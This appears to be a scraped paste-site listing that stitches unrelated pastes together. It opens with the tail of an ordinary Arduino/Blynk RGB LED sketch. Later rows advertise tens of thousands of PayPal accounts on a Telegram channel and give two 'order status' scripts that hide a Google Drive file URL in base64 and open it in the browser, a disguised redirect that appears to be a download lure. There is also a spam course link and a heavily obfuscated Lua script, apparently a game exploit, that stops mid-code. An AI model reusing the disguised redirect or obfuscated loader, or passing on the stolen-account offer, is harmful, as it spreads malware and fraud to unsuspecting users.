    if (l < 0.5) {
      t_1 = l * (1.0 + s);
    } else {
      t_1 = l + s - l * s;
    }
    
    t_2 = 2.0 * l - t_1;
    
    // convert hue in degress to 1 by diving by 360 degrees
    h /= 360.0;
    
    t_r = h + (1.0/3.0);
    if (t_r < 0.0) {
      t_r += 1.0;
    }
    if (t_r > 1.0) {
      t_r -= 1.0;
    }
    
    t_g = h;
    if (t_g < 0.0) {
      t_g += 1.0;
    }
    if (t_g > 1.0) {
      t_g -= 1.0;
    }
    
    t_b = h - (1.0/3.0);
    if (t_b < 0.0) {
      t_b += 1.0;
    }
    if (t_b > 1.0) {
      t_b -= 1.0;
    }
    
    // red
    if (6.0*t_r < 1.0) {
      result.r = static_cast<int>(round((t_2 + (t_1 - t_2) * 6.0 * t_r) * 255.0));
    } else if (2.0*t_r < 1.0) {
      result.r = static_cast<int>(round(t_1 * 255.0));
    } else if (3.0*t_r < 2.0) {
      result.r = static_cast<int>(round((t_2 + (t_1 - t_2) * (2.0/3.0 - t_r) * 6.0) * 255.0));
    } else if (3.0*t_r > 2.0) {
      result.r = static_cast<int>(round(t_2 * 255.0));
    }

    // green
    if (6.0*t_g < 1.0) {
      result.g = static_cast<int>(round((t_2 + (t_1 - t_2) * 6.0 * t_g) * 255.0));
    } else if (2.0*t_g < 1.0) {
      result.g = static_cast<int>(round(t_1 * 255.0));
    } else if (3.0*t_g < 2.0) {
      result.g = static_cast<int>(round((t_2 + (t_1 - t_2) * (2.0/3.0 - t_g) * 6.0) * 255.0));
    } else if (3.0*t_g > 2.0) {
      result.g = static_cast<int>(round(t_2 * 255.0));
    }

    // blue
    if (6.0*t_b < 1.0) {
      result.b = static_cast<int>(round((t_2 + (t_1 - t_2) * 6.0 * t_b) * 255.0));
    } else if (2.0*t_b < 1.0) {
      result.b = static_cast<int>(round(t_1 * 255.0));
    } else if (3.0*t_b < 2.0) {
      result.b = static_cast<int>(round((t_2 + (t_1 - t_2) * (2.0/3.0 - t_b) * 6.0) * 255.0));
    } else if (3.0*t_b > 2.0) {
      result.b = static_cast<int>(round(t_2 * 255.0));
    }
        
  }
  
  return result;
  
} // hsl2rgb()


void setRGB(uint8_t red, uint8_t green, uint8_t blue, uint8_t luminance, bool gamma_correct) {

  // Note: the Blynk RGB Light Control widget color values 
  // assume the use of a common cathode RGB. 
  
  bool white_mode = false;

  if (red > 218 && green > 218 && blue > 168) {
    // Possibly in White Mode
    white_mode = true;
  }

  if (MAX_COLOR_VALUE == 255 && gamma_correct == true && white_mode == false) {
    // Gamma correction is applied to compensate for the non-linearity of 
    // the human eye perception of color using pgm_read_byte(&gamma8[color]);
    red = pgm_read_byte(&gamma8[red]);
    green = pgm_read_byte(&gamma8[green]);
    blue = pgm_read_byte(&gamma8[blue]);
  }
  
  // Scale RGB color values based on the luminance setting.
  // Note that above 50% luminance, the color changes a lot.
  // Therefore, scale everything down by 1/2, so 100% = 50%.
  HSL_t hsl = rgb2hsl(red, green, blue);
  // hsl.l range is 0.0 to 1.0
  // luminance range is 0 to 100
  // Scale luminance from 0 to 100 to 0.0 to 1.0
  hsl.l = static_cast<double>(luminance)/100.0;
  // Scale luminance further by 1/2 to keep color true
  hsl.l /= 2.0;
  RGB_t rgb = hsl2rgb(hsl.h, hsl.s, hsl.l);
  red = rgb.r; green = rgb.g; blue=rgb.b;

  #ifdef COMMON_ANODE
    red = MAX_COLOR_VALUE - red;
    green = MAX_COLOR_VALUE - green;
    blue = MAX_COLOR_VALUE - blue;
  #else
    // common cathode RGB
  #endif

  // Write the RGB values to the RGB attached to the hardware
  analogWrite(PIN_RED, red);
  analogWrite(PIN_GREEN, green);
  analogWrite(PIN_BLUE, blue);  
} // setRGB()

uint8_t rgb_light_control_mode = 0; // 0 = mode unknown, 1 = Color, 2 = White, 3 = Animation
uint8_t animation_fade_strobe = 0;  // 0 = mode unknown, 1 = strobe, 2 = fade
RGB_t rgb_color_white_mode;
uint8_t animation_pattern_count = 0;  // either 3 or 2 when known
RGB_t rgb_animation_left;
RGB_t rgb_animation_right;
RGB_t rgb_animation_top;

/////////////////////////////////////////////////////////////////////////


BLYNK_WRITE(V10) {   
  // V10    integer, BUTTON, 0 or 1
  // Turn RGB on/off based on the BUTTON value
  int btn_state = param.asInt();  
  if (btn_state == 1) {
    // do nothing with rgb_brightness
  } else {
    rgb_brightness = 0;
  }
  Serial.print(""V10 = '"");
  Serial.print(btn_state);
  Serial.println(""'  BUTTON.."");
  setRGB(rgb_red, rgb_green, rgb_blue, rgb_brightness, GAMMA_CORRECT);
} // BLYNK_WRITE(V10)


BLYNK_WRITE(V2) {   
  // Called when datastream for virtual pin V2 is updated
  // V2    string, COLOR

  Serial.println("""");
  //Serial.println(""All V2 array items:"");
  byte param_items_count = 0;
  for (auto i = param.begin(); i < param.end(); ++i) {
    //Serial.print(""\t"");
    //Serial.print(param_items_count); 
    //Serial.print("" = '""); 
    //Serial.print(i.asString());
    //Serial.println(""'"");
    if (param_items_count == 3) {
      String button_mode = i.asString();
      if (button_mode == ""true"") {
        rgb_light_control_mode = 1; // Color Mode
      } else if (button_mode == ""false"") {
        rgb_light_control_mode = 2; // White Mode
      }
    }
    if (param_items_count == 4) {
      //Serial.println(""\tparam_items_count == 4"");
      rgb_light_control_mode = 3; // Animation mode
      int fade_strobe = param[4].asInt();
      if (fade_strobe == 0) {
        animation_fade_strobe = 2;  // fade
      } else if (fade_strobe == 1) {
        animation_fade_strobe = 1;  // strobe
      } else {
        animation_fade_strobe = 0;
      }   
    }
    param_items_count++;
  }
  //Serial.print(""param_items_count = ""); Serial.println(param_items_count);

  rgb_color_white_mode.r = param[0].asInt();
  rgb_color_white_mode.g = param[1].asInt();
  rgb_color_white_mode.b = param[2].asInt();
  
  if (param_items_count > 4) {
    rgb_animation_left.r = param[5].asInt();;
    rgb_animation_left.g = param[6].asInt();;
    rgb_animation_left.b = param[7].asInt();;
  }
  if (param_items_count == 11) {
    animation_pattern_count = 2;
    rgb_animation_top.r = 0;
    rgb_animation_top.g = 0;
    rgb_animation_top.b = 0;
    rgb_animation_right.r = param[8].asInt();;
    rgb_animation_right.g = param[9].asInt();;
    rgb_animation_right.b = param[10].asInt();;
  } else if (param_items_count == 14) {
    animation_pattern_count = 3;
    rgb_animation_top.r = param[8].asInt();;
    rgb_animation_top.g = param[9].asInt();;
    rgb_animation_top.b = param[10].asInt();;
    rgb_animation_right.r = param[11].asInt();;
    rgb_animation_right.g = param[12].asInt();;
    rgb_animation_right.b = param[13].asInt();;  
  } else {
    animation_pattern_count = 0;
  }

  // Using the populated global values for:
  //  rgb_light_control_mode, animation_fade_strobe, rgb_light_control_mode
  //  animation_fade_strobe, rgb_color_white_mode, rgb_animation_left
  //  rgb_animation_right, rgb_animation_top, animation_pattern_count
  switch (rgb_light_control_mode) {
    case 0:
      // button mode unknown
      Serial.println(""RGB Light Control button mode UNKNOWN"");
      break;
    case 1:
      // Color Mode
      Serial.println(""Color Mode"");
      Serial.print(""R: ""); Serial.print(rgb_color_white_mode.r); Serial.print(""\tG:""); Serial.print(rgb_color_white_mode.g); Serial.print(""\tB:""); Serial.println(rgb_color_white_mode.b);
      break;
    case 2:
      // White Mode
      Serial.println(""White Mode"");
      Serial.print(""R: ""); Serial.print(rgb_color_white_mode.r); Serial.print(""\tG:""); Serial.print(rgb_color_white_mode.g); Serial.print(""\tB:""); Serial.println(rgb_color_white_mode.b);
      break;
    case 3:
      // Animation Mode
      if (animation_fade_strobe == 1) {
        Serial.println(""Animation Mode - strobe"");        
      } else if (animation_fade_strobe == 2) {
        Serial.println(""Animation Mode - fade"");        
      } 
      if (animation_fade_strobe > 0) {
        Serial.print(""\t""); Serial.print(animation_pattern_count); Serial.println(""x Pattern: "");
        Serial.print(""\tLeft\tR: ""); Serial.print(rgb_animation_left.r); Serial.print(""\tG:""); Serial.print(rgb_animation_left.g); Serial.print(""\tB:""); Serial.println(rgb_animation_left.b);
        if (animation_pattern_count > 2) {
          Serial.print(""\tTop\tR: ""); Serial.print(rgb_animation_top.r); Serial.print(""\tG:""); Serial.print(rgb_animation_top.g); Serial.print(""\tB:""); Serial.println(rgb_animation_top.b);
        }
        Serial.print(""\tRight\tR: ""); Serial.print(rgb_animation_right.r); Serial.print(""\tG:""); Serial.print(rgb_animation_right.g); Serial.print(""\tB:""); Serial.println(rgb_animation_right.b);
      }
      break;
  } // switch
  Serial.println("""");
  
  setRGB(rgb_color_white_mode.r, rgb_color_white_mode.g, rgb_color_white_mode.b, rgb_brightness, GAMMA_CORRECT);
  
} // BLYNK_WRITE(V2)


BLYNK_WRITE(V6) {   
  // V6    integer, BRIGHTNESS. 0 to 100
  rgb_brightness = param.asInt();
  Serial.print(""V6 = '"");
  Serial.print(rgb_brightness);
  Serial.println(""'  BRIGHTNESS.."");
  setRGB(rgb_red, rgb_green, rgb_blue, rgb_brightness, GAMMA_CORRECT);
} // BLYNK_WRITE(V6)


BLYNK_WRITE(V5) {   
  // V5    integer, ANIMATION SPEED, 0 to 10000
  int animation_speed = param.asInt();
  Serial.print(""V5 = '"");
  Serial.print(animation_speed);
  Serial.println(""'  ANIMATION SPEED"");
} // BLYNK_WRITE(V5)

BLYNK_CONNECTED() {
  // Executes every time Blynk is connected to the cloud
  // (typically only if WiFi connection is lost, otherwise Blynk stays connected)
  Serial.println(""BLYNK_CONNECTED() .. Blynk connected to the cloud."");

  // Request Blynk server to re-send latest values for all virtual pins
  Blynk.syncAll();
} // BLYNK_CONNECTED

/////////////////////////////////////////////////////////////////////////


void setup() {
  Serial.begin(115200);
  while (!Serial) {
    delay(1);
  }
  Serial.println(""\nSerial ready"");

  // RGB
  pinMode(PIN_RED, OUTPUT);
  pinMode(PIN_GREEN, OUTPUT);
  pinMode(PIN_BLUE, OUTPUT);
  setRGB(0, 0, 0, 0, GAMMA_CORRECT);

  rgb_color_white_mode.r = 0; 
  rgb_color_white_mode.g = 0; 
  rgb_color_white_mode.b = 0; 

  rgb_animation_left.r = 0; 
  rgb_animation_left.g = 0; 
  rgb_animation_left.b = 0; 

  rgb_animation_right.r = 0; 
  rgb_animation_right.g = 0; 
  rgb_animation_right.b = 0; 

  rgb_animation_top.r = 0; 
  rgb_animation_top.g = 0; 
  rgb_animation_top.b = 0; 

  // Try to connect to Blynk Cloud.
  Serial.println(""Connecting to Blynk.."");
  Blynk.begin(BLYNK_AUTH_TOKEN, ssid, pass);

  Serial.println(""\nSetup complete\n"");
} // setup()


void loop() {

  Blynk.run();

} // loop()
"
U6APWxrs,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Monday 21st of April 2025 06:14:21 PM CDT,85935 Accounts Posted On https://t.me/l34ksbyemin3m
B0e5jLM1,Order.js,zebmekey,JavaScript,Monday 21st of April 2025 06:13:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98195/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YdzBkHfA,stock_trade.py,Abhisek92,Python,Monday 21st of April 2025 06:01:26 PM CDT,"def max_k_transactions(b, s, k):
    n = len(b)
    if n < 2 or k == 0:
        return list(), list()

    dp = [[0] * n for _ in range(k + 1)]
    track = [[None] * n for _ in range(k + 1)]

    for t in range(1, k + 1):
        max_diff = -b[1]
        best_buy = 1
        for i in range(1, n):
            if i < n - 1:
                if dp[t-1][i] - b[i] > max_diff:
                    max_diff = dp[t-1][i] - b[i]
                    best_buy = i
            if i > 0:
                profit = s[i] + max_diff
                if profit > dp[t][i-1]:
                    dp[t][i] = profit
                    track[t][i] = (best_buy, i)
                else:
                    dp[t][i] = dp[t][i-1]
                    track[t][i] = track[t][i-1]

    buys, sells = list(), list()
    t, i = k, n - 1
    while t > 0 and i > 0:
        pair = track[t][i]
        if pair is None:
            i -= 1
        else:
            buy, sell = pair
            if not sells or sell < sells[-1]:
                buys.append(buy)
                sells.append(sell)
                i = buy - 1
                t -= 1
            else:
                i -= 1

    return buys[::-1], sells[::-1]
"
85ndtLdG,Market.js,zebmekey,JavaScript,Monday 21st of April 2025 05:57:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/22618/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NmF75STZ,Build a Backend REST API with Python & Django - Advanced,f0f077,Python,Monday 21st of April 2025 05:46:43 PM CDT,"Build a Backend REST API with Python & Django - Advanced
Create an advanced REST API with Python, Django REST Framework and Docker using Test Driven Development (TDD)
What you will learn
Setting up a local development server with Docker
Writing a Python project using Test Driven Development
Building a REST API with advanced features such as uploading and viewing images
Creating a backend that can be used a base for your future projects or MVP
for more:https://short-jambo.ink/NsDm"
hYjv9Rrd,FE INSANE MAN,Smartdumgood,Lua,Monday 21st of April 2025 05:42:24 PM CDT,"--[[ v1.0.0 https://Javascript.net/obfuscator ]] return(function(...)local g={""\109\100\120\090\068\065\061\061"";""\088\070\104\054\119\072\079\061"";""\049\056\097\071\119\107\097\071\068\109\101\102\068\070\104\083"",""\088\072\084\100\068\106\061\061"",""\116\081\101\071\049\099\085\083\085\089\061\061"";""\119\086\099\061"","""";""\088\056\100\102\085\103\084\122"";""\107\103\055\066\097\097\089\072\097\112\068\061"",""\049\072\101\105\121\107\055\090"";""\085\107\055\065\068\107\084\069"";""\049\081\122\056\049\071\083\081\087\112\073\069\052\109\084\053\121\089\061\061"",""\068\047\097\056\121\053\088\047\115\075\097\107\052\083\085\055"",""\048\106\061\061"",""\087\052\052\105\121\050\084\048\119\052\073\073\047\053\085\122\121\051\061\061"";""\052\099\076\076\115\070\102\054\088\112\101\069\097\097\113\074\115\089\061\061"";""\119\103\097\043"";""\048\110\106\083\088\108\122\113\048\106\061\061"";""\088\056\112\111\088\051\061\061"",""\119\107\112\071\121\089\061\061"";""\109\100\120\057\088\107\076\061"";""\065\080\116\085\068\047\108\075\085\089\084\118\083\118\065\098\104\078\116\082\106\076\055\078\070\098\057\075\049\049\078\072\079\111\065\107\089\084\112\099\072\105\067\087\070\114\112\080\090\052\089\103\075\106\102\114\071\086\075\097\075\120\086\116\080\101\075\122\097\122\072\097\086\055\121\113\118\083\084\088\074\057\048\084\076\048\052\051\055\121\114\049\047\100\071\075\055\087\049\061"",""\068\090\083\071\088\051\061\061"",""\101\070\111\051\084\072\084\099\116\112\085\090\121\071\102\098\107\106\061\061"";""\084\056\076\076\116\099\101\086\116\100\085\102\068\072\073\054\115\112\051\061"",""\119\086\079\061"";""\052\056\088\072\101\109\085\081\097\072\073\108\047\112\084\081\116\089\061\061"",""\068\056\120\043\068\056\112\071"",""\101\081\097\066\049\075\071\072\048\047\077\069\119\056\104\054\107\090\052\061"";""\049\070\112\043\088\103\120\111"",""\109\100\120\113\119\070\101\083\087\089\061\061"",""\049\103\084\102\119\103\065\061"",""\097\103\112\111\049\103\097\105\079\099\101\083\085\103\097\053\085\103\097\075\079\051\061\061"";""\047\075\068\065\085\056\120\098\116\047\079\076\097\107\120\075\116\072\079\061"",""\087\103\112\080\115\075\112\108\097\072\077\069\097\052\101\054"";""\049\100\099\072\119\050\097\121\119\106\061\061"";""\085\103\120\043\085\107\100\110\088\109\079\061"";""\068\056\102\102\049\106\061\061"";""\049\100\102\115\084\103\084\056\052\112\073\102\097\072\113\104\115\056\075\061"",""\109\100\120\111\088\109\101\102\085\103\112\110\119\103\052\061"";""\085\103\112\110\119\103\052\061"";""\085\103\120\050\085\081\073\113\119\070\049\061"",""\119\103\120\102\088\081\084\071\049\070\083\043\088\065\061\061"",""\048\047\097\099\048\112\052\061"";""\088\109\073\105\119\072\079\061"";""\116\099\100\071\097\097\088\112\052\083\085\055\121\103\120\097\052\097\051\061"";""\049\070\097\111\119\072\088\083""}local function p(p)return g[p+(-936311+995181)]end for p,i in ipairs({{-79541+79542;599673-599626};{-170875+170876,-924398+924419},{-845423+845445,969098+-969051}})do while i[-285267-(-285268)]<i[-386820-(-386822)]do g[i[-878860+878861]],g[i[229194+-229192]],i[-355471-(-355472)],i[240484+-240482]=g[i[-775035+775037]],g[i[436382-436381]],i[817236+-817235]+(-449894-(-449895)),i[-269361-(-269363)]-(352269-352268)end end do local p=string.sub local i=type local T={[""\053""]=-350665+350700;N=531107-531048;u=-137502+137533;Q=-172611+172618;Y=-900360+900360;a=-555363-(-555384);D=619124+-619100,U=415437-415408;H=-183537+183592,B=-175724+175735;[""\056""]=-819267+819321;G=646598+-646546;F=-706731-(-706769),n=-186171+186205;[""\048""]=-342954+342968,[""\049""]=-536691+536719,[""\052""]=254419+-254399,[""\054""]=771234+-771187,c=899188+-899184;t=-1042257-(-1042275);C=-23817+23880,S=-779634+779671;M=-260746+260747;g=180965-180959,Z=820206+-820167,i=335122+-335072;L=1036696+-1036640,[""\051""]=-45824+45840,[""\043""]=228465-228419;k=-810167+810189;[""\047""]=-286844+286863;m=35629-35606;J=-340890+340900,s=83604+-83592;b=99768-99726,d=371629+-371576,h=526534+-526485;v=-279470-(-279532),K=-20116-(-20152);[""\057""]=461667-461623;V=756905-756902,p=-327875-(-327880),A=701795-701747,y=-574522+574548;O=-849075-(-849083),z=402413+-402373;[""\050""]=254626+-254575;l=-933647+933649;e=-523737+523754,W=-998646+998676;E=-913380-(-913423),R=-375133-(-375193),x=-569791-(-569852),j=-620446-(-620478),o=488118-488073;P=139491-139433,f=-533735-(-533768);q=-373800-(-373841);[""\055""]=684286+-684229;I=140398-140389;X=735689+-735664,r=-80752+80767;T=768862+-768849,w=-329425+329452}local O=g local s=math.floor local I=string.len local Y=table.insert local o=table.concat local G=string.char for g=700926-700925,#O,-704144+704145 do local u=O[g]if i(u)==""\115\116\114\105\110\103""then local i=I(u)local D={}local N=-687335+687336 local k=-873113-(-873113)local Q=246201+-246201 while N<=i do local g=p(u,N,N)local O=T[g]if O then k=k+O*(-634361+634425)^((515040+-515037)-Q)Q=Q+(-368323+368324)if Q==98603-98599 then Q=325932-325932 local g=s(k/(459599+-394063))local p=s((k%(-157629-(-223165)))/(-736351+736607))local i=k%(-1531+1787)Y(D,G(g,p,i))k=1043395+-1043395 end elseif g==""\061""then Y(D,G(s(k/(867193-801657))))if N>=i or p(u,N+(370136-370135),N+(-155093+155094))~=""\061""then Y(D,G(s((k%(666766-601230))/(211336-211080))))end break end N=N+(1041097+-1041096)end O[g]=o(D)end end end return(function(g,T,O,s,I,Y,o,n,w,D,e,k,i,u,Q,G,X,M,F,N,r)N,M,w,D,G,e,n,Q,u,i,F,X,r,k=526067-526067,function(g)u[g]=u[g]-(-142887-(-142888))if-526426+526426==u[g]then u[g],G[g]=nil,nil end end,function(g,p)local T=k(p)local O=function(...)return i(g,{...},p,T)end return O end,function()N=N+(-161499+161500)u[N]=-770090+770091 return N end,{},function(g,p)local T=k(p)local O=function(O,s,I,Y,o,G)return i(g,{O,s;I;Y;o;G},p,T)end return O end,function(g,p)local T=k(p)local O=function(O,s,I)return i(g,{O;s,I},p,T)end return O end,function(g)local p,i=-533274+533275,g[-493469-(-493470)]while i do u[i],p=u[i]-(1022895-1022894),(-526283+526284)+p if 832928-832928==u[i]then u[i],G[i]=nil,nil end i=g[p]end end,{},function(i,O,s,I)local P,z,K,C,t,j,U,B,W,w,c,a,A,q,u,v,R,h,S,m,N,x,k,y,d,V,Z,f,L,Q,J,o,H,E while i do if i<-1047890+9792429 then if i<5123448-66054 then if i<3447418-452051 then if i<958707-(-908460)then if i<910985-276190 then if i<-351191-(-845696)then if i<-392732-(-686603)then i=G[s[-826519+826529]]N=G[s[784275+-784264]]u[i]=N i=G[s[647977+-647965]]N={i(u)}i=g[p(-391065-(-332228))]o={T(N)}else G[N]=B i=G[N]i=i and 727426+8180989 or 214337+9856968 end else i=o and 11759350-(-364496)or 3623007-(-283348)end else if i<1294838-192232 then i=433287+4084922 N=G[s[1036668-1036665]]k=146871-146729 u=N*k N=-200094+200351 o=u%N G[s[65431-65428]]=o else i=-66973-(-374040)C=R==d B=C end end else if i<431586+2031107 then if i<1938528-(-112396)then i={}u=i k=G[s[25156-25147]]Q=k k=673620+-673619 N=-685930-(-685931)w=k i=260198+8341149 k=-160913+160913 t=w<k k=N-w else G[N]=f K=G[A]h=132599-132598 y=K+h W=v[y]P=R+W W=-1002555-(-1002811)i=P%W y=G[U]R=i W=d+y i=5349371-11435 y=372749-372493 P=W%y d=P end else if i<-1249+2702609 then k=14022759-(-953996)N=p(903045-961869)o=932238+4356162 u=N^k i=o-u o=p(137841-196701)u=i i=o/u o={i}i=g[p(-462028+403161)]else i=F(-607387+5831840,{Q})C={i()}i=g[p(862402+-921238)]o={T(C)}end end end else if i<-556489+4614140 then if i<3005488-(-841220)then if i<-176546+3920280 then if i<3785192-651652 then E=672828+-672827 j=#L i=845031+6678805 a=Q(E,j)E=t(L,a)j=G[d]U=618060+-618059 a=nil z=E-U q=x(z)j[E]=q E=nil else i=P o=f i=8365962-(-703492)end else C=G[N]B=C i=C and-275228+1710052 or 648170-341103 end else if i<3323832-(-685204)then i=G[s[620634+-620627]]i=i and 7648128-(-988352)or-403471+2305191 else P=G[N]f=P i=P and 11332231-578560 or 527962+1648255 end end else if i<-255857+4476835 then if i<665528+3411134 then J=D()a=X(15455983-117606,{})R=827330+-827265 G[J]=o L=p(640689+-699553)i=G[x]H=-118721-(-118724)o=i(H,R)V=p(555256+-614110)i=901805-901805 H=D()G[H]=o R=i i=-297410-(-297410)d=i o=g[L]L={o(a)}o=951585+-951583 i={T(L)}L=i i=L[o]a=i o=p(-702721-(-643862))i=g[o]E=G[k]C=g[V]V=C(a)C=p(-470124-(-411293))B=E(V,C)E={B()}o=i(T(E))E=D()G[E]=o o=-1007225+1007226 B=G[H]C=B B=21580-21579 i=7643085-(-785004)V=B B=387610-387610 j=V<B B=o-V else a=nil a=781382+-781381 N=M(N)N=nil d=nil Q=M(Q)L=nil t=nil w=M(w)J=M(J)H=M(H)R=nil Z=nil d=D()k=M(k)t=p(-399043-(-340214))E=M(E)w=g[t]x=M(x)H=D()x=p(372063+-430892)k=nil t=p(-971705+912858)Z=p(967440-1026295)Q=w[t]w=D()R={}G[w]=Q t=g[x]x=p(600676-659542)Q=t[x]J=p(206285+-265124)x=g[Z]Z=p(459533-518382)t=x[Z]Z=g[J]J=p(-353498-(-294640))x=Z[J]J=D()Z=123921-123921 G[J]=Z Z=-38502-(-38504)G[H]=Z Z={}L={}G[d]=R R=-629351-(-629351)E=-549809-(-550065)j=E E=404644-404643 q=E i=277541+9234382 E=500574-500574 z=q<E E=a-q end else if i<4898194-(-18672)then N=G[s[903346-903343]]k=-809788+809789 u=N~=k i=u and 11645514-(-444736)or 327180-(-422372)else w=-753094+753096 N=G[s[-681349-(-681350)]]Q=541995-541994 k=N(Q,w)N=104109-104108 u=k==N i=u and-69405-(-607398)or 7192252-(-846449)o=u end end end end else if i<6529535-(-690514)then if i<853769+5391976 then if i<5015754-(-247398)then if i<-241519+5457978 then if i<-752396+5950308 then k=p(796126-854981)N=g[k]i=g[p(165706-224575)]k=p(-343477-(-284628))u=N[k]k=G[s[264835+-264834]]N={u(k)}o={T(N)}else u=p(464032-522895)o=p(194935-253786)i=g[o]o=i(u)o={}i=g[p(-374491-(-315641))]end else i=7794383-(-425936)end else if i<6001550-151466 then m=M(m)A=M(A)U=M(U)z=M(z)v=nil i=8222780-(-205309)c=M(c)q=M(q)else o={}i=g[p(-628548-(-569686))]end end else if i<766558+6065184 then if i<6728754-100405 then G[s[8810+-8805]]=o i=-236775+4143130 u=nil else V=p(-384211-(-325357))i=g[V]q=p(-152073+93230)j=g[q]V=i(j)i=p(-507208+448385)g[i]=V i=796138+14132832 end else if i<631563+6275941 then V=257772-257771 j=-132404-(-132410)i=G[x]C=i(V,j)j=p(-47109-11714)i=p(-967607+908784)g[i]=C V=g[j]j=-813116+813118 i=V>j i=i and 276978+6376517 or-779111+16705374 else f=G[N]i=f and 966014+6724101 or 9809676-740222 o=f end end end else if i<8757318-702682 then if i<881875+6777773 then if i<7124649-(-310715)then if i<-1029086+8315245 then i=H o=J i=J and 125263+3946072 or 12809784-639397 else H=H+R Z=H<=J L=not d Z=L and Z L=H>=J L=d and L Z=L or Z L=-860434+14362251 i=Z and L Z=14281058-290705 i=i or Z end else E=#L j=820163+-820163 a=E==j i=a and 13196411-(-734983)or 3241186-235925 end else if i<-749079+8494819 then K=-122968+122969 P=i y=v[K]K=false W=y==K f=W i=W and 372841+8821645 or 3722120-507111 else N=G[s[834370-834368]]k=G[s[140030-140027]]i=816880-278887 u=N==k o=u end end else if i<8329673-(-183979)then if i<1022442+7283292 then i=true i=i and 865132+14766493 or-927433+16380389 else B=B+V o=B<=C q=not j o=q and o q=B>=C q=j and q o=q or o q=14909676-(-907722)i=o and q o=4610535-841306 i=i or o end else if i<-815254+9438283 then x=not t k=k+w N=k<=Q N=x and N x=k>=Q x=t and x N=x or N x=-47161+15513021 i=N and x N=211277-(-76076)i=i or N else u=p(-230544+171693)i=g[u]k=331197+-331197 N=G[s[98642-98634]]u=i(N,k)i=2412951-511231 end end end end end else if i<-922370+14924779 then if i<12544953-967877 then if i<8593848-(-952508)then if i<9617646-371032 then if i<9749813-644694 then if i<306517+8743340 then i=-926769+5004706 else G[N]=o i=110021+5227915 end else K=-719823+719825 y=v[K]K=G[m]W=y==K f=W i=4191346-976337 end else if i<9905439-385117 then U=not z E=E+q a=E<=j a=U and a U=E>=j U=z and U a=U or a U=16080075-(-169146)i=a and U a=15818816-(-707040)i=i or a else i=true o={}G[s[824422+-824421]]=i i=g[p(-505071+446237)]end end else if i<-939379+11255011 then if i<10278899-269073 then i=true i=i and 7434178-538938 or 5412746-(-810918)else i=true i=1724253-(-1042327)end else if i<-532449+11060281 then i=-166779+9871470 else W=-642294+642295 P=v[W]i=683273+1492944 f=P end end end else if i<566181+12680842 then if i<11649775-(-481388)then if i<-373861+12472011 then if i<-61317+12043047 then i=true N=D()u=O k=p(-228135-(-169296))G[N]=i o=g[k]x=p(-871198-(-812334))k=p(922872-981713)i=o[k]Q=D()k=D()G[k]=i w=D()i=n(4521762-(-681316),{})G[Q]=i Z=X(10442749-920543,{w})i=false G[w]=i t=g[x]x=t(Z)o=x i=x and 202904+14983254 or 16034853-132243 else k=-904206-(-904238)N=G[s[-66425+66428]]J=-976710-(-976712)u=N%k R=658844-658831 Q=G[s[-819251+819255]]x=G[s[-947126+947128]]a=G[s[163416-163413]]L=a-u a=854030+-853998 d=L/a H=R-d i=-218218+5413227 Z=J^H t=x/Z w=Q(t)Q=4295362157-394861 k=w%Q w=-980463+980465 Q=w^u N=k/Q Z=5352-5351 Q=G[s[374623+-374619]]x=N%Z Z=4294706135-(-261161)t=x*Z x=727950+-662414 J=-232282-(-232538)w=Q(t)Q=G[s[360879+-360875]]t=Q(N)k=w+t w=-512204+577740 R=1021818-1021562 Q=k%w t=k-Q w=t/x x=839648-839392 t=Q%x Z=Q-t x=Z/J J=954616-954360 Z=w%J Q=nil k=nil H=w-Z J=H/R w=nil N=nil H={t,x,Z,J}Z=nil x=nil J=nil t=nil u=nil G[s[-808144-(-808145)]]=H end else o=p(777842-836701)J=n(2580756-70921,{})i=g[o]u=G[s[-194869+194873]]Q=p(326184-385038)k=g[Q]Z=p(-447108-(-388244))x=g[Z]Z={x(J)}t={T(Z)}x=-379510-(-379512)w=t[x]Q=k(w)k=p(-328190+269359)N=u(Q,k)u={N()}o=i(T(u))N=G[s[724060+-724055]]u=o o=N i=N and 326637+14670395 or-1012897+7343510 end else if i<734519+11508722 then H=p(804033+-862871)J=g[H]i=1004026+3067309 o=J else L=p(-944520+885665)i=-380864+7622466 d=g[L]L=p(667661+-726499)R=d[L]J=R end end else if i<14013669-322156 then if i<13217435-(-264748)then N=O[-308171-(-308173)]u=O[672333-672332]i=G[s[1040999-1040998]]k=i i=k[N]i=i and 122765+14118948 or 14812216-782403 else Z=H 